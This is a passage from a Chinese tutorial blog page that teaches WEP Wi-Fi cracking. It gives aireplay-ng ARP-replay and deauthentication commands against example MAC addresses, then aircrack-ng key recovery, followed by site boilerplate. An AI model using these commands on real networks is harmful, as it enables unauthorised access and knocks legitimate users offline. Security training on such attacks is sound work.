+<h3 id="7-进行ARP注入攻击"><a href="#7-进行ARP注入攻击" class="headerlink" title="7.进行ARP注入攻击"></a>7.进行ARP注入攻击</h3><p>arp重放攻击，通过模拟客户端发送ARP请求，获取AP的响应报文，通过AP报文获取ivs初始化向量</p>
+<pre class="line-numbers language-none"><code class="language-none">aireplay-ng -3 -b D8:24:BD:79:18:0B -h 18:CC:18:C5:D5:64 wlan0mon
+-3:arpreplay：arp重放攻击
+-b:bssid AP的mac地址
+-h:客户端的mac地址<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>遇到这个错误时，重新连接wifi会一直报【无法连接到该wifi】，这时候，需要ctrl+C停掉arp重放攻击，然后重新在发起一个新的arp重放攻击，在连接wifi就ok了</p>
+<p><img src="images/image-20211117110615154.png" alt="image-20211117110615154"></p>
+<h3 id="8-使用Deautenticate攻击模式"><a href="#8-使用Deautenticate攻击模式" class="headerlink" title="8.使用Deautenticate攻击模式"></a>8.使用Deautenticate攻击模式</h3><p>使已经连接的合法客户端强制断开与路由端的连接，使其重新连接。在重新连接过程中获得验证数据包，从而产生有效 ARP request。（也不一定能成功，不成功多试几次）</p>
+<pre class="line-numbers language-none"><code class="language-none">aireplay-ng -0 5 -a D8:24:BD:79:18:0B -c 18:CC:18:C5:D5:64 wlan0mon
+-0：冲突攻击模式，后面跟发送次数（设置为 0，则为循环攻击，不停的断开连接，客户端无法正常上网）
+-a:设置 ap 的 mac
+-c：设置已连接的合法客户端的 mac<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="9-手动连接AP"><a href="#9-手动连接AP" class="headerlink" title="9.手动连接AP"></a>9.手动连接AP</h3><p>等待Frame到5-10万时，就可以尝试破解了</p>
+<p><img src="images/image-20211116164029929.png" alt="image-20211116164029929"></p>
+<h3 id="10-破解WIFI，获取WEP密码"><a href="#10-破解WIFI，获取WEP密码" class="headerlink" title="10.破解WIFI，获取WEP密码"></a>10.破解WIFI，获取WEP密码</h3><pre class="line-numbers language-none"><code class="language-none">aircrack-ng /root/wifi/bk01/WEP-01.ivs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>遇到这种说明ivs样本不够，按ctrl+c退出，在等一会重新执行破解命令就可以。也可以在这个界面保持不动，当ivs达到5000时，他会自动重新破解</p>
+<p><img src="images/image-20211117105203267.png" alt="image-20211117105203267"></p>
+<p>ivs样本足够时，很快就能破解出来了</p>
+<p><img src="images/image-20211116165048843.png" alt="image-20211116165048843"></p>
+<h2 id="8-课程小结"><a href="#8-课程小结" class="headerlink" title="8.课程小结"></a>8.课程小结</h2><p>参考：课后笔记</p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="../../../../../../../../about" rel="external nofollow noreferrer">fantasycat6</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://fantasycat6.github.io">https://fantasycat6.github.io</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="../../../../../../../../about" target="_blank">fantasycat6</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="../../../../../../../../libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="../../../../../../../../libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="../../../../../../../../medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="../../../../../../../../medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="../../wifi06-gerix-wifi-cracker-zi-dong-hua-s-shen-tou-wep-jia-mi/di-6-zhang-wep-po-jie-gerix-wifi-cracker-zi-dong-hua-po-jie-wep-jia-mi/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="../../../../../../../../medias/featureimages/0.jpg" class="responsive-img" alt="">
+                        
+                        <span class="card-title"></span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2023-07-16
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            fantasycat6
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="../../wifi04-shou-xi-kismet/di-4-zhang-shou-xi-kismet/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="../../../../../../../../medias/featureimages/0.jpg" class="responsive-img" alt="">
+                        
+                        <span class="card-title"></span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-07-16
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            fantasycat6
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('120')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: Hexo<br />'
+            + '文章作者: fantasycat6<br />'
+            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="../../../../../../../../libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="../../../../../../../../libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="../../../../../../../../libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="../../../../../../../../libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="../../../../../../../../libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="../../../../../../../../libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="7788095093"
+                   fixed='true'
+                   autoplay='true'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="../../../../../../../../libs/aplayer/APlayer.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+
+    
+    <div class="container row center-align" style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2022-2023</span>
+            
+            <span id="year">2022</span>
+            <a href="../../../../../../../../about" target="_blank">fantasycat6</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">312.9k</span>&nbsp;字
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/fantasycat6" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:1745272762@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1745272762" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1745272762" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="../../../../../../../../atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('../../../../../../../../search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="../../../../../../../../libs/materialize/materialize.min.js"></script>
+    <script src="../../../../../../../../libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="../../../../../../../../libs/aos/aos.js"></script>
+    <script src="../../../../../../../../libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="../../../../../../../../libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="../../../../../../../../js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="../../../../../../../../libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="../../../../../../../../libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+	
+    
+
+    
+
+    
+
+    
+    <script src="../../../../../../../../libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
